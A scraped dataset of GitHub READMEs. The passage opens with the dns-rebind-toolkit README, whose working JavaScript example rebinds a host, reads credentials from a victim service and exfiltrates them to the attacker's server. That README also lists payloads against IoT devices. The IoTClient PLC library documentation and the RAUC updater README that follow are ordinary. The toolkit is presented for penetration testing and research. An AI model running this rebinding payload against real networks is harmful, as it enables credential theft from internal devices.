\"pragma\": \"no-cache\",\n// \"cache-control\": \"no-cache\"\n// },\n// cache: \"no-cache\"\n// }\nconst getoptions = dnsrebindnode.fetchoptions()\ntry {\n// in this example, we'll pretend we are attacking some service with\n// an /auth.json file with username/password sitting in plaintext.\n// before we swipe those creds, we need to first perform the rebind\n// attack. most likely, our webserver will cache the dns results\n// for this page's host. dnsrebindnode.rebind(...) recursively\n// re-attempts to rebind the host with a new, target ip address.\n// this can take over a minute, and if it is unsuccessful the\n// promise is rejected.\nconst opts = {\n// these options get passed to the dns rebind fetch request\nfetchoptions: getoptions,\n// by default, dnsrebindnode.rebind() is considered successful\n// if it receives an http 200 ok response from the target service.\n// however, you can define any kind of \"rebind success\" scenario\n// yourself with the successpredicate(...) function. this\n// function receives a fetch result as a parameter and the return\n// value determines if the rebind was successful (i.e. you are\n// communicating with the target server). here we check to see\n// if the fetchresult was sent by our example vulnerable server.\nsuccesspredicate: (fetchresult) => {\nreturn fetchresult.headers.get('server') == 'example vulnerable server v1.0'\n}\n}\n// await the rebind. can take up to over a minute depending on the\n// victim's dns cache settings or if there is no host listening on\n// the other side.\nawait dnsrebindnode.rebind(`http://${location.host}/auth.json`, opts)\n} catch (err) {\n// whoops, the rebind failed. either the browser's dns cache was\n// never cleared, or more likely, this service isn't running on the\n// target host. oh well... bubble up the rejection and have our\n// attack()'s rejection handler deal w/ it.\nreturn promise.reject(err)\n}\ntry {\n// alrighty, now that we've rebound the host and are communicating\n// with the target service, let's grab the credentials\nconst creds = await fetch(`http://${location.host}/auth.json`)\n.then(res => res.json())\n// {\n// \"username\": \"crashoverride\",\n// \"password\": \"hacktheplanet!\",\n// }\n// console.log(creds)\n// great, now let's exfiltrate those creds to the node.js server\n// running this whole shebang. that's the last thing we care about,\n// so we will just return this promise as the result of attack()\n// and let its handler's deal with it.\n//\n// note: the second argument to exfiltrate(...) must be json\n// serializable.\nreturn dnsrebindnode.exfiltrate('auth-example', creds)\n} catch (err) {\nreturn promise.reject(err)\n}\n}\n</script>\n</body>\n</html>\nserver.js\nthis script is used to deliver the launcher.html and payload.html files, as well as receive and save exifltrated data from the dnsrebindnode to the data/ folder. for development, i usually run this server on localhost and point dnsrebindattack.attack(...) towards 127.0.0.1. for production, i run the server on a vps cloud server and point dnsrebindattack.attack(...) to its public ip address.\n# run with admin privileged so that it can open port 80.\nsudo node server\nusage: server [-h] [-v] [-p port]\ndns rebind toolkit server\noptional arguments:\n-h, --help show this help message and exit.\n-v, --version show program's version number and exit.\n-p port, --port port which ports to bind the servers on. may include\nmultiple like: --port 80 --port 1337 (default: -p 80\n-p 8008 -p 8060 -p 1337)\nmore examples\ni've included an example vulnerable server in examples/vulnerable-server.js. this vulnerable service must be run from another machine on your network, as it's port must match the same port as server.js. to run this example attack yourself, do the following:\nsecondary computer\n# clone the repo\ngit clone https://github.com/brannondorsey/dns-rebind-toolkit\ncd dns-rebind-toolkit\n# launch the vulnerable server\nnode examples/vulnerable-server\n# ...\n# vulnerable server is listening on 3000\nprimary computer\nnode server --port 3000\nnow, navigate your browser to http://localhost:3000/launcher.html and open a dev console. wait a minute or two, if the attack worked you should see some dumped credz from the vulnerable server running on the secondary computer.\ncheck out the examples/ and payloads/ directories for more examples.\nfiles and directories\nserver.js: the dns rebind toolkit server\npayloads/: several html payload files hand-crafted to target a few vulnerable iot devices. includes attacks against google home, roku, and radio thermostat for now. i would love to see more payloads added to this repo in the future (prs welcome!)\nexamples/: example usage files.\ndata/: directory where data exfiltrated by dnsrebindnode.exfiltrate(...) is saved.\nshare/: directory of javascript files shared by multiple html files in examples/ and payload/.\nthis toolkit was developed to be a useful tool for researchers and penetration testers. if you'd like to see some of the research that led to it's creation, check out this post. if you write a payload for another service, consider making a pr to this repository so that others can benefit from your work!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000206, "year": null}, {"Unnamed: 0": 208, "autor": 208, "date": null, "content": "IoTClient\nEnglish | \u4e2d\u6587\u6587\u6863\nThis is an IoT device communication protocol realization client, which will include mainstream PLC communication reading, ModBus protocol, Bacnet protocol and other common industrial communication protocols.\nThis component is based on .NET Standard 2.0 and can be used for cross-platform development of .Net, such as Windows, Linux and even run on Raspberry Pi.\nThis component is open source and free for life, and adopts the most relaxed MIT protocol. You can also modify and use it for commercial use (commercial use please evaluate and test).\nDevelopment tools\uff1aVisual Studio 2019\nQQ exchange group\uff1a995475200\nDocument directory\nInstructions for use\nReference component\nModBusTcp read and write operations\nModBusRtu read and write operations\nModBusAscii read and write operations\nModbusRtuOverTcp read and write operations\nSiemensClient (Siemens) read and write operations\nNote: About Siemens PLC address\nSiemensClient best practices\nMitsubishiClient (Mitsubishi) read and write operations\nOmronFinsClient (Omron) read and write operations\nAllenBradleyClient read and write operations\nSome projects based on IoTClient library\nIoTClient Tool Desktop program tool (open source)\nEnergy Management System (Commercial)\n\u80fd\u6e90\u7ba1\u7406-\u73b0\u573a-\u5355\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u4e91\u7aef-\u591a\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u79fb\u52a8\u7aef\nHaidilao terminal control (commercial)\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-web\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-\u79fb\u52a8\u7aef\nInstructions for use\nReference component\nNuget installation Install-Package IoTClient\nOr graphical installation\nModBusTcp read and write operations\n//1\u3001Instantiate the client-enter the correct IP and port\nModBusTcpClient client = new ModBusTcpClient(\"127.0.0.1\", 502);\n//2\u3001Write operation-parameters are: address, value, station number, function code\nclient.Write(\"4\", (short)33, 2, 16);\n//2.1\u3001[Note] When writing data, you need to clarify the data type\nclient.Write(\"0\", (short)33, 2, 16); //Write short type value\nclient.Write(\"4\", (ushort)33, 2, 16); //Write ushort type value\nclient.Write(\"8\", (int)33, 2, 16); //Write int type value\nclient.Write(\"12\", (uint)33, 2, 16); //Write uint type value\nclient.Write(\"16\", (long)33, 2, 16); //Write long type value\nclient.Write(\"20\", (ulong)33, 2, 16); //Write ulong type value\nclient.Write(\"24\", (float)33, 2, 16); //Write float type value\nclient.Write(\"28\", (double)33, 2, 16); //Write double type value\nclient.Write(\"32\", true, 2, 5); //Write Coil type value\nclient.Write(\"100\", \"orderCode\", stationNumber); //Write string\n//3\u3001Read operation-the parameters are: address, station number, function code\nvar value = client.ReadInt16(\"4\", 2, 3).Value;\n//3.1\u3001Other types of data reading\nclient.ReadInt16(\"0\", stationNumber, 3); //short type data read\nclient.ReadUInt16(\"4\", stationNumber, 3); //ushort type data read\nclient.ReadInt32(\"8\", stationNumber, 3); //int type data read\nclient.ReadUInt32(\"12\", stationNumber, 3); //uint type data read\nclient.ReadInt64(\"16\", stationNumber, 3); //long type data read\nclient.ReadUInt64(\"20\", stationNumber, 3); //ulong type data read\nclient.ReadFloat(\"24\", stationNumber, 3); //float type data read\nclient.ReadDouble(\"28\", stationNumber, 3); //double type data read\nclient.ReadCoil(\"32\", stationNumber, 1); //Coil type data read\nclient.ReadDiscrete(\"32\", stationNumber, 2);//Discrete type data read\nclient.ReadString(\"100\", stationNumber,readLength:10); //Read string\n//4\u3001If there is no active Open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. So it is recommended to open and close manually.\nclient.Open();\n//5\u3001Read and write operations will return the operation result object Result\nvar result = client.ReadInt16(\"4\", 2, 3);\n//5.1 Whether the reading is successful (true or false)\nvar isSucceed = result.IsSucceed;\n//5.2 Exception information for failed reading\nvar errMsg = result.Err;\n//5.3 Read the request message actually sent by the operation\nvar requst = result.Requst;\n//5.4 Read the response message from the server\nvar response = result.Response;\n//5.5 Read value\nvar value3 = result.Value;\n//6\u3001Batch read\nvar list = new List<ModBusInput>();\nlist.Add(new ModBusInput()\n{\nAddress = \"2\",\nDataType = DataTypeEnum.Int16,\nFunctionCode = 3,\nStationNumber = 1\n});\nlist.Add(new ModBusInput()\n{\nAddress = \"2\",\nDataType = DataTypeEnum.Int16,\nFunctionCode = 4,\nStationNumber = 1\n});\nlist.Add(new ModBusInput()\n{\nAddress = \"199\",\nDataType = DataTypeEnum.Int16,\nFunctionCode = 3,\nStationNumber = 1\n});\nvar result = client.BatchRead(list);\n//7\u3001Other parameters of the constructor\n//IP, port, timeout time, big and small end settings\nModBusTcpClient client = new ModBusTcpClient(\"127.0.0.1\", 502, 1500, EndianFormat.ABCD);\nFor more usage of ModBusTcp, please refer to Unit Test\nModBusRtu read and write operations\n//Instantiate the client-[COM port name, baud rate, data bits, stop bits, parity]\nModBusRtuClient client = new ModBusRtuClient(\"COM3\", 9600, 8, StopBits.One, Parity.None);\n//Other read and write operations are the same as ModBusTcpClient's read and write operations\nModBusAscii read and write operations\n//Instantiate the client-[COM port name, baud rate, data bits, stop bits, parity]\nModbusAsciiClient client = new ModbusAsciiClient(\"COM3\", 9600, 8, StopBits.One, Parity.None);\n//Other read and write operations are the same as ModBusTcpClient's read and write operations\nModbusRtuOverTcp read and write operations\n//Serial port transparent transmission i.e.: send Rtu format messages in Tcp mode\n//Instantiate the client-IP, port, timeout, big and small end settings\nModbusRtuOverTcpClient client = new ModbusRtuOverTcpClient(\"127.0.0.1\", 502, 1500, EndianFormat.ABCD);\n//Other read and write operations are the same as ModBusTcpClient's read and write operations\nSiemensClient (Siemens) read and write operations\n//1\u3001Instantiate the client-enter the model, IP and port\n//Other models\uff1aSiemensVersion.S7_200\u3001SiemensVersion.S7_300\u3001SiemensVersion.S7_400\u3001SiemensVersion.S7_1200\u3001SiemensVersion.S7_1500\nSiemensClient client = new SiemensClient(SiemensVersion.S7_200Smart, \"127.0.0.1\",102);\n//2\u3001Write operation\nclient.Write(\"Q1.3\", true);\nclient.Write(\"V2205\", (short)11);\nclient.Write(\"V2209\", 33);\n//3\u3001Read operation\nvar value1 = client.ReadBoolean(\"Q1.3\").Value;\nvar value2 = client.ReadInt16(\"V2205\").Value;\nvar value3 = client.ReadInt32(\"V2209\").Value;\n//4\u3001If there is no active Open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. So it is recommended to open and close manually.\nclient.Open();\n//5\u3001Read and write operations will return the operation result object Result\nvar result = client.ReadInt16(\"V2205\");\n//5.1 Whether the reading is successful (true or false)\nvar isSucceed = result.IsSucceed;\n//5.2 Exception information for failed reading\nvar errMsg = result.Err;\n//5.3 Read the request message actually sent by the operation\nvar requst = result.Requst;\n//5.4 Read the response message from the server\nvar response = result.Response;\n//5.5 Read value\nvar value4 = result.Value;\nNote: About Siemens PLC address\nVB263\u3001VW263\u3001VD263\u4e2d\u7684B\u3001W\u3001D\u5206\u522b\u8868\u793a\uff1abyte\u578b(8\u4f4d)\u3001word\u578b(16\u4f4d)\u3001doubleword\u578b(32\u4f4d)\u3002\nWhen this component passes in the address, there is no need to carry the data type, just use the corresponding method to read the corresponding type, such as:\nVB263 - client.ReadByte(\"V263\")\nVD263 - client.ReadFloat(\"V263\")\nVD263 - client.ReadInt32(\"V263\")\nDB108.DBW4 - client.ReadUInt16(\"DB108.4\")\nDB1.DBX0.0 - client.ReadBoolean(\"DB1.0.0\")\nDB1.DBD0 - client.ReadFloat(\"DB1.0\")\nC# data type smart200 1200/1500/300\nbit V1.0 DB1.DBX1.0\nbyte VB1 DB1.DBB1\nshor\nushort VW2 DB1.DBW2\nint\nuint\nfloat VD4 DB1.DBD4\nSiemensClient best practices\n1\u3001When not to take the initiative to open\nSiemens plc generally allows up to 8 long connections. So when the number of connections is not enough or when doing testing, do not take the initiative to open, so that the component will automatically open and close immediately.\n2\u3001When to take the initiative to open\nWhen the number of long connections is enough, and you want to improve the read and write performance.\n3\u3001In addition to active Open connections, batch read and write can also greatly improve read and write performance.\n//Batch read\nDictionary<string, DataTypeEnum> addresses = new Dictionary<string, DataTypeEnum>();\naddresses.Add(\"DB4.24\", DataTypeEnum.Float);\naddresses.Add(\"DB1.434.0\", DataTypeEnum.Bool);\naddresses.Add(\"V4109\", DataTypeEnum.Byte);\n...\nvar result = client.BatchRead(addresses);\n//Batch write\nDictionary<string, object> addresses = new Dictionary<string, object>();\naddresses.Add(\"DB4.24\", (float)1);\naddresses.Add(\"DB4.0\", (float)2);\naddresses.Add(\"DB1.434.0\", true);\n...\nvar result = client.BatchWrite(addresses);\n4\u3001[Note] When writing data, you need to clarify the data type\nclient.Write(\"DB4.12\", 9); //What is written is of type int\nclient.Write(\"DB4.12\", (float)9); //What is written is a float type\n5\u3001SiemensClient is a thread safe class\nDue to limited long PLC connections, SiemensClient is designed as a thread-safe class. You can set SiemensClient as a singleton, and use the instance of SiemensClient to read and write PLC between multiple threads.\nMitsubishiClient (Mitsubishi) read and write operations\n//1\u3001Instantiate the client-enter the correct IP and port\nMitsubishiClient client = new MitsubishiClient(MitsubishiVersion.Qna_3E, \"127.0.0.1\",6000);\n//2\u3001Write operation\nclient.Write(\"M100\", true);\nclient.Write(\"D200\", (short)11);\nclient.Write(\"D210\", 33);\n//3\u3001Read operation\nvar value1 = client.ReadBoolean(\"M100\").Value;\nvar value2 = client.ReadInt16(\"D200\").Value;\nvar value3 = client.ReadInt32(\"D210\").Value;\n//4\u3001If there is no active Open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. So it is recommended to open and close manually.\nclient.Open();\n//5\u3001Read and write operations will return the operation result object Result\nvar result = client.ReadInt16(\"D210\");\n//5.1 Whether the reading is successful (true or false)\nvar isSucceed = result.IsSucceed;\n//5.2 Exception information for failed reading\nvar errMsg = result.Err;\n//5.3 Read the request message actually sent by the operation\nvar requst = result.Requst;\n//5.4 Read the response message from the server\nvar response = result.Response;\n//5.5 Read value\nvar value4 = result.Value;\nOmronFinsClient (Omron) read and write operations\n//1\u3001Instantiate the client-enter the correct IP and port\nOmronFinsClient client = new OmronFinsClient(\"127.0.0.1\",6000);\n//2\u3001Write operation\nclient.Write(\"M100\", true);\nclient.Write(\"D200\", (short)11);\nclient.Write(\"D210\", 33);\n//3\u3001Read operation\nvar value1 = client.ReadBoolean(\"M100\").Value;\nvar value2 = client.ReadInt16(\"D200\").Value;\nvar value3 = client.ReadInt32(\"D210\").Value;\n//4\u3001If there is no active Open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. So it is recommended to open and close manually.\nclient.Open();\n//5\u3001Read and write operations will return the operation result object Result\nvar result = client.ReadInt16(\"D210\");\n//5.1 Whether the reading is successful (true or false)\nvar isSucceed = result.IsSucceed;\n//5.2 Exception information for failed reading\nvar errMsg = result.Err;\n//5.3 Read the request message actually sent by the operation\nvar requst = result.Requst;\n//5.4 Read the response message from the server\nvar response = result.Response;\n//5.5 Read value\nvar value4 = result.Value;\nAllenBradleyClient read and write operations\n//1\u3001Instantiate the client-enter the correct IP and port\nAllenBradleyClient client = new AllenBradleyClient(\"127.0.0.1\",44818);\n//2\u3001Write operation\nclient.Write(\"A1\", (short)11);\n//3\u3001Read operation\nvar value = client.ReadInt16(\"A1\").Value;\n//4\u3001If there is no active Open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. So it is recommended to open and close manually.\nclient.Open();\n//5\u3001Read and write operations will return the operation result object Result\nvar result = client.ReadInt16(\"A1\");\n//5.1 Whether the reading is successful (true or false)\nvar isSucceed = result.IsSucceed;\n//5.2 Exception information for failed reading\nvar errMsg = result.Err;\n//5.3 Read the request message actually sent by the operation\nvar requst = result.Requst;\n//5.4 Read the response message from the server\nvar response = result.Response;\n//5.5 Read value\nvar value4 = result.Value;\nSome projects based on IoTClient library\nIoTClient Tool Desktop program tool (open source)\nIoTClient Tool \u684c\u9762\u7a0b\u5e8f\u5de5\u5177\uff0c\u5f00\u6e90\u5730\u5740\u3002\n1\u3001\u53ef\u7528\u6765\u6d4b\u8bd5PLC\u548c\u76f8\u5173\u534f\u8bae\u7684\u901a\u4fe1\n2\u3001\u53ef\u4f5c\u4e3aIoTClient\u5e93\u4f7f\u7528\u4f8b\u5b50\u3002\nEnergy Management System (Commercial)\n\u80fd\u6e90\u7ba1\u7406-\u73b0\u573a-\u5355\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u4e91\u7aef-\u591a\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u79fb\u52a8\u7aef\nHaidilao terminal control (commercial)\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-web\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-\u79fb\u52a8\u7aef", "link": "https://github.com/zhaopeiym/IoTClient", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "iotclient\nenglish | \u4e2d\u6587\u6587\u6863\nthis is an iot device communication protocol realization client, which will include mainstream plc communication reading, modbus protocol, bacnet protocol and other common industrial communication protocols.\nthis component is based on .net standard 2.0 and can be used for cross-platform development of .net, such as windows, linux and even run on raspberry pi.\nthis component is open source and free for life, and adopts the most relaxed mit protocol. you can also modify and use it for commercial use (commercial use please evaluate and test).\ndevelopment tools\uff1avisual studio 2019\nqq exchange group\uff1a995475200\ndocument directory\ninstructions for use\nreference component\nmodbustcp read and write operations\nmodbusrtu read and write operations\nmodbusascii read and write operations\nmodbusrtuovertcp read and write operations\nsiemensclient (siemens) read and write operations\nnote: about siemens plc address\nsiemensclient best practices\nmitsubishiclient (mitsubishi) read and write operations\nomronfinsclient (omron) read and write operations\nallenbradleyclient read and write operations\nsome projects based on iotclient library\niotclient -----> tool !!!  desktop program -----> tool !!!  (open source)\nenergy management system (commercial)\n\u80fd\u6e90\u7ba1\u7406-\u73b0\u573a-\u5355\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u4e91\u7aef-\u591a\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u79fb\u52a8\u7aef\nhaidilao terminal control (commercial)\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-web\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-\u79fb\u52a8\u7aef\ninstructions for use\nreference component\nnuget installation install-package iotclient\nor graphical installation\nmodbustcp read and write operations\n//1\u3001instantiate the client-enter the correct ip and port\nmodbustcpclient client = new modbustcpclient(\"127.0.0.1\", 502);\n//2\u3001write operation-parameters are: address, value, station number, function code\nclient.write(\"4\", (short)33, 2, 16);\n//2.1\u3001[note] when writing data, you need to clarify the data type\nclient.write(\"0\", (short)33, 2, 16); //write short type value\nclient.write(\"4\", (ushort)33, 2, 16); //write ushort type value\nclient.write(\"8\", (int)33, 2, 16); //write int type value\nclient.write(\"12\", (uint)33, 2, 16); //write uint type value\nclient.write(\"16\", (long)33, 2, 16); //write long type value\nclient.write(\"20\", (ulong)33, 2, 16); //write ulong type value\nclient.write(\"24\", (float)33, 2, 16); //write float type value\nclient.write(\"28\", (double)33, 2, 16); //write double type value\nclient.write(\"32\", true, 2, 5); //write coil type value\nclient.write(\"100\", \"ordercode\", stationnumber); //write string\n//3\u3001read operation-the parameters are: address, station number, function code\nvar value = client.readint16(\"4\", 2, 3).value;\n//3.1\u3001other types of data reading\nclient.readint16(\"0\", stationnumber, 3); //short type data read\nclient.readuint16(\"4\", stationnumber, 3); //ushort type data read\nclient.readint32(\"8\", stationnumber, 3); //int type data read\nclient.readuint32(\"12\", stationnumber, 3); //uint type data read\nclient.readint64(\"16\", stationnumber, 3); //long type data read\nclient.readuint64(\"20\", stationnumber, 3); //ulong type data read\nclient.readfloat(\"24\", stationnumber, 3); //float type data read\nclient.readdouble(\"28\", stationnumber, 3); //double type data read\nclient.readcoil(\"32\", stationnumber, 1); //coil type data read\nclient.readdiscrete(\"32\", stationnumber, 2);//discrete type data read\nclient.readstring(\"100\", stationnumber,readlength:10); //read string\n//4\u3001if there is no active open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. so it is recommended to open and close manually.\nclient.open();\n//5\u3001read and write operations will return the operation result object result\nvar result = client.readint16(\"4\", 2, 3);\n//5.1 whether the reading is successful (true or false)\nvar issucceed = result.issucceed;\n//5.2 exception information for failed reading\nvar errmsg = result.err;\n//5.3 read the request message actually sent by the operation\nvar requst = result.requst;\n//5.4 read the response message from the server\nvar response = result.response;\n//5.5 read value\nvar value3 = result.value;\n//6\u3001batch read\nvar list = new list<modbusinput>();\nlist.add(new modbusinput()\n{\naddress = \"2\",\ndatatype = datatypeenum.int16,\nfunctioncode = 3,\nstationnumber = 1\n});\nlist.add(new modbusinput()\n{\naddress = \"2\",\ndatatype = datatypeenum.int16,\nfunctioncode = 4,\nstationnumber = 1\n});\nlist.add(new modbusinput()\n{\naddress = \"199\",\ndatatype = datatypeenum.int16,\nfunctioncode = 3,\nstationnumber = 1\n});\nvar result = client.batchread(list);\n//7\u3001other parameters of the constructor\n//ip, port, timeout time, big and small end settings\nmodbustcpclient client = new modbustcpclient(\"127.0.0.1\", 502, 1500, endianformat.abcd);\nfor more usage of modbustcp, please refer to unit test\nmodbusrtu read and write operations\n//instantiate the client-[com port name, baud rate, data bits, stop bits, parity]\nmodbusrtuclient client = new modbusrtuclient(\"com3\", 9600, 8, stopbits.one, parity.none);\n//other read and write operations are the same as modbustcpclient's read and write operations\nmodbusascii read and write operations\n//instantiate the client-[com port name, baud rate, data bits, stop bits, parity]\nmodbusasciiclient client = new modbusasciiclient(\"com3\", 9600, 8, stopbits.one, parity.none);\n//other read and write operations are the same as modbustcpclient's read and write operations\nmodbusrtuovertcp read and write operations\n//serial port transparent transmission i.e.: send rtu format messages in tcp mode\n//instantiate the client-ip, port, timeout, big and small end settings\nmodbusrtuovertcpclient client = new modbusrtuovertcpclient(\"127.0.0.1\", 502, 1500, endianformat.abcd);\n//other read and write operations are the same as modbustcpclient's read and write operations\nsiemensclient (siemens) read and write operations\n//1\u3001instantiate the client-enter the model, ip and port\n//other models\uff1asiemensversion.s7_200\u3001siemensversion.s7_300\u3001siemensversion.s7_400\u3001siemensversion.s7_1200\u3001siemensversion.s7_1500\nsiemensclient client = new siemensclient(siemensversion.s7_200smart, \"127.0.0.1\",102);\n//2\u3001write operation\nclient.write(\"q1.3\", true);\nclient.write(\"v2205\", (short)11);\nclient.write(\"v2209\", 33);\n//3\u3001read operation\nvar value1 = client.readboolean(\"q1.3\").value;\nvar value2 = client.readint16(\"v2205\").value;\nvar value3 = client.readint32(\"v2209\").value;\n//4\u3001if there is no active open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. so it is recommended to open and close manually.\nclient.open();\n//5\u3001read and write operations will return the operation result object result\nvar result = client.readint16(\"v2205\");\n//5.1 whether the reading is successful (true or false)\nvar issucceed = result.issucceed;\n//5.2 exception information for failed reading\nvar errmsg = result.err;\n//5.3 read the request message actually sent by the operation\nvar requst = result.requst;\n//5.4 read the response message from the server\nvar response = result.response;\n//5.5 read value\nvar value4 = result.value;\nnote: about siemens plc address\nvb263\u3001vw263\u3001vd263\u4e2d\u7684b\u3001w\u3001d\u5206\u522b\u8868\u793a\uff1abyte\u578b(8\u4f4d)\u3001word\u578b(16\u4f4d)\u3001doubleword\u578b(32\u4f4d)\u3002\nwhen this component passes in the address, there is no need to carry the data type, just use the corresponding method to read the corresponding type, such as:\nvb263 - client.readbyte(\"v263\")\nvd263 - client.readfloat(\"v263\")\nvd263 - client.readint32(\"v263\")\ndb108.dbw4 - client.readuint16(\"db108.4\")\ndb1.dbx0.0 - client.readboolean(\"db1.0.0\")\ndb1.dbd0 - client.readfloat(\"db1.0\")\nc# data type smart200 1200/1500/300\nbit v1.0 db1.dbx1.0\nbyte vb1 db1.dbb1\nshor\nushort vw2 db1.dbw2\nint\nuint\nfloat vd4 db1.dbd4\nsiemensclient best practices\n1\u3001when not to take the initiative to open\nsiemens plc generally allows up to 8 long connections. so when the number of connections is not enough or when doing testing, do not take the initiative to open, so that the component will automatically open and close immediately.\n2\u3001when to take the initiative to open\nwhen the number of long connections is enough, and you want to improve the read and write performance.\n3\u3001in addition to active open connections, batch read and write can also greatly improve read and write performance.\n//batch read\ndictionary<string, datatypeenum> addresses = new dictionary<string, datatypeenum>();\naddresses.add(\"db4.24\", datatypeenum.float);\naddresses.add(\"db1.434.0\", datatypeenum.bool);\naddresses.add(\"v4109\", datatypeenum.byte);\n...\nvar result = client.batchread(addresses);\n//batch write\ndictionary<string, object> addresses = new dictionary<string, object>();\naddresses.add(\"db4.24\", (float)1);\naddresses.add(\"db4.0\", (float)2);\naddresses.add(\"db1.434.0\", true);\n...\nvar result = client.batchwrite(addresses);\n4\u3001[note] when writing data, you need to clarify the data type\nclient.write(\"db4.12\", 9); //what is written is of type int\nclient.write(\"db4.12\", (float)9); //what is written is a float type\n5\u3001siemensclient is a thread safe class\ndue to limited long plc connections, siemensclient is designed as a thread-safe class. you can set siemensclient as a singleton, and use the instance of siemensclient to read and write plc between multiple threads.\nmitsubishiclient (mitsubishi) read and write operations\n//1\u3001instantiate the client-enter the correct ip and port\nmitsubishiclient client = new mitsubishiclient(mitsubishiversion.qna_3e, \"127.0.0.1\",6000);\n//2\u3001write operation\nclient.write(\"m100\", true);\nclient.write(\"d200\", (short)11);\nclient.write(\"d210\", 33);\n//3\u3001read operation\nvar value1 = client.readboolean(\"m100\").value;\nvar value2 = client.readint16(\"d200\").value;\nvar value3 = client.readint32(\"d210\").value;\n//4\u3001if there is no active open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. so it is recommended to open and close manually.\nclient.open();\n//5\u3001read and write operations will return the operation result object result\nvar result = client.readint16(\"d210\");\n//5.1 whether the reading is successful (true or false)\nvar issucceed = result.issucceed;\n//5.2 exception information for failed reading\nvar errmsg = result.err;\n//5.3 read the request message actually sent by the operation\nvar requst = result.requst;\n//5.4 read the response message from the server\nvar response = result.response;\n//5.5 read value\nvar value4 = result.value;\nomronfinsclient (omron) read and write operations\n//1\u3001instantiate the client-enter the correct ip and port\nomronfinsclient client = new omronfinsclient(\"127.0.0.1\",6000);\n//2\u3001write operation\nclient.write(\"m100\", true);\nclient.write(\"d200\", (short)11);\nclient.write(\"d210\", 33);\n//3\u3001read operation\nvar value1 = client.readboolean(\"m100\").value;\nvar value2 = client.readint16(\"d200\").value;\nvar value3 = client.readint32(\"d210\").value;\n//4\u3001if there is no active open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. so it is recommended to open and close manually.\nclient.open();\n//5\u3001read and write operations will return the operation result object result\nvar result = client.readint16(\"d210\");\n//5.1 whether the reading is successful (true or false)\nvar issucceed = result.issucceed;\n//5.2 exception information for failed reading\nvar errmsg = result.err;\n//5.3 read the request message actually sent by the operation\nvar requst = result.requst;\n//5.4 read the response message from the server\nvar response = result.response;\n//5.5 read value\nvar value4 = result.value;\nallenbradleyclient read and write operations\n//1\u3001instantiate the client-enter the correct ip and port\nallenbradleyclient client = new allenbradleyclient(\"127.0.0.1\",44818);\n//2\u3001write operation\nclient.write(\"a1\", (short)11);\n//3\u3001read operation\nvar value = client.readint16(\"a1\").value;\n//4\u3001if there is no active open, it will automatically open and close the connection every time you read and write operations, which will greatly reduce the efficiency of reading and writing. so it is recommended to open and close manually.\nclient.open();\n//5\u3001read and write operations will return the operation result object result\nvar result = client.readint16(\"a1\");\n//5.1 whether the reading is successful (true or false)\nvar issucceed = result.issucceed;\n//5.2 exception information for failed reading\nvar errmsg = result.err;\n//5.3 read the request message actually sent by the operation\nvar requst = result.requst;\n//5.4 read the response message from the server\nvar response = result.response;\n//5.5 read value\nvar value4 = result.value;\nsome projects based on iotclient library\niotclient tool desktop program tool (open source)\niotclient tool \u684c\u9762\u7a0b\u5e8f\u5de5\u5177\uff0c\u5f00\u6e90\u5730\u5740\u3002\n1\u3001\u53ef\u7528\u6765\u6d4b\u8bd5plc\u548c\u76f8\u5173\u534f\u8bae\u7684\u901a\u4fe1\n2\u3001\u53ef\u4f5c\u4e3aiotclient\u5e93\u4f7f\u7528\u4f8b\u5b50\u3002\nenergy management system (commercial)\n\u80fd\u6e90\u7ba1\u7406-\u73b0\u573a-\u5355\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u4e91\u7aef-\u591a\u9879\u76ee\n\u80fd\u6e90\u7ba1\u7406-\u79fb\u52a8\u7aef\nhaidilao terminal control (commercial)\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-web\n\u6d77\u5e95\u635e\u672b\u7aef\u63a7\u5236-\u79fb\u52a8\u7aef", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000208, "year": null}, {"Unnamed: 0": 214, "autor": 214, "date": null, "content": "RAUC - Robust Auto-Update Controller\nRAUC controls the update process on embedded Linux systems. It is both a target application that runs as an update client and a host/target tool that allows you to create, inspect and modify installation artifacts.\nSource Code: https://github.com/rauc/rauc\nDocumentation: https://rauc.readthedocs.org/\nChat: IRC channel #rauc on libera.chat (bridged to the Matrix channel #rauc:matrix.org)\nFeatures\nFail-Safe & Atomic:\nAn update may be interrupted at any point without breaking the running system.\nUpdate compatibility check\nAtomic bootloader updates (eMMC boot partitions, MBR, GPT)\nCryptographic signing and verification of updates using OpenSSL (signatures based on x.509 certificates)\nKeys and certificates on PKCS#11 tokens (HSMs) are supported\nFlexible and customizable redundancy/storage setup\nSymmetric setup (Root-FS A & B)\nAsymmetric setup (recovery & normal)\nApplication partition, data partitions, ...\nAllows grouping of multiple slots (rootfs, appfs) as update targets\nNetwork streaming mode using casync\nchunk-based binary delta updates\nsignificantly reduce download size\nno extra storage required\nBootloader support:\ngrub\nbarebox\nu-boot\nEFI\nCustom implementation\nStorage support:\next4 filesystem\neMMC boot partitions (atomic update)\nvfat 